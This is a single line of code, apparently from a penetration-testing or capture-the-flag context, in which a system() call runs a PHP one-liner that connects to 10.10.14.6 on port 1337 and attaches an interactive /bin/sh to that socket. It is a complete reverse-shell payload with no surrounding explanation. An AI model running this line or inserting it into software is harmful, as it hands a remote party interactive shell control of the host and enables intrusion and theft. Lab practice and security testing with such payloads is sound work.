system('php -r \' $sock=fsockopen("10.10.14.6",1337);exec("/bin/sh -i <&3 >&3 2>&3");\'')
